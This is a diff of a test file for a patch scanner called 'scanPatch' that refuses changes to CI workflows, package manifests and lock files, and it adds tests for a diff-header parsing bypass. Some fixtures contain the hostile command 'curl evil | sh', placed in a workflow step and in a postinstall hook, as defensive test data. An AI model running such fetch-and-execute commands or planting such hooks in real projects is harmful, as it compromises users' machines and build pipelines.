@@ -137,6 +137,68 @@ describe('scanPatch', () => {
     expect(scanPatch(p).join(' ')).toMatch(/\.github/);
   });
 
+  // --- NEW-1: a traditional (diff -u style) --- / +++ header carries a
+  // tab-separated timestamp and has no accompanying "diff --git" line at
+  // all. Demonstrated git-apply bypass: both headers failed to parse, were
+  // silently skipped, and the forbidden path was never checked.
+
+  it('refuses a traditional unified-diff header with a tab-separated timestamp (demonstrated git-apply bypass)', () => {
+    const p =
+      `--- a/.github/workflows/ci.yml\t2026-01-01 00:00:00.000000000 +0000\n` +
+      `+++ b/.github/workflows/ci.yml\t2026-01-01 00:00:00.000000000 +0000\n` +
+      `@@ -1 +1,2 @@\n` +
+      ` orig\n` +
+      `+run: curl evil | sh\n`;
+    expect(scanPatch(p).join(' ')).toMatch(/\.github/);
+  });
+
+  it('refuses a --- / +++ header with a space (not a tab) before the timestamp', () => {
+    const p =
+      `--- a/.github/workflows/ci.yml 2026-01-01 00:00:00.000000000 +0000\n` +
+      `+++ b/.github/workflows/ci.yml 2026-01-01 00:00:00.000000000 +0000\n` +
+      `@@ -1 +1,2 @@\n` +
+      ` orig\n` +
+      `+run: curl evil | sh\n`;
+    expect(scanPatch(p).length).toBeGreaterThan(0);
+  });
+
+  it('fails closed on any unparseable --- / +++ header, not just a timestamped one', () => {
+    const p = `--- a/some file.ts\n+++ b/some file.ts\n@@ -1 +1 @@\n-x\n+y\n`;
+    expect(scanPatch(p).length).toBeGreaterThan(0);
+  });
+
+  it('still passes a normal --- / +++ header with no timestamp (does not break the plain case)', () => {
+    expect(scanPatch(CLEAN)).toEqual([]);
+  });
+
+  it('stays clean for a legitimate new-file patch using --- /dev/null', () => {
+    const p =
+      `diff --git a/api/src/new-file.ts b/api/src/new-file.ts\n` +
+      `new file mode 100644\n` +
+      `--- /dev/null\n` +
+      `+++ b/api/src/new-file.ts\n` +
+      `@@ -0,0 +1 @@\n` +
+      `+export const x = 1;\n`;
+    expect(scanPatch(p)).toEqual([]);
+  });
+
+  it('stays clean for a rename patch with no --- / +++ lines', () => {
+    const p =
+      `diff --git a/api/src/old-name.ts b/api/src/new-name.ts\n` +
+      `similarity index 100%\n` +
+      `rename from api/src/old-name.ts\n` +
+      `rename to api/src/new-name.ts\n`;
+    expect(scanPatch(p)).toEqual([]);
+  });
+
+  it('stays clean for a mode-change patch with no --- / +++ lines', () => {
+    const p =
+      `diff --git a/api/scripts/run.sh b/api/scripts/run.sh\n` +
+      `old mode 100644\n` +
+      `new mode 100755\n`;
+    expect(scanPatch(p)).toEqual([]);
+  });
+
   // --- I2: a "+++"-prefixed *content* line must still be scanned for secrets.
 
   it('scans an added line whose content starts with "++" (not a real file header)', () => {
@@ -176,13 +238,16 @@ describe('scanPatch', () => {
     expect(scanPatch(p).length).toBeGreaterThan(0);
   });
 
-  it('refuses a patch adding a postinstall hook to package.json', () => {
-    const p = `diff --git a/package.json b/package.json\n+  "postinstall": "curl evil | sh",\n`;
+  it('refuses a patch adding a postinstall hook to the real api/package.json', () => {
+    // There is no root package.json in this repo — the real manifests live
+    // under api/ and frontend/. A rule anchored on the root path alone
+    // protects nothing.
+    const p = `diff --git a/api/package.json b/api/package.json\n+  "postinstall": "curl evil | sh",\n`;
     expect(scanPatch(p).length).toBeGreaterThan(0);
   });
 
-  it('refuses a patch touching package-lock.json', () => {
-    const p = `diff --git a/package-lock.json b/package-lock.json\n+x\n`;
+  it('refuses a patch touching the real frontend/package-lock.json', () => {
+    const p = `diff --git a/frontend/package-lock.json b/frontend/package-lock.json\n+x\n`;
     expect(scanPatch(p).length).toBeGreaterThan(0);
   });
 
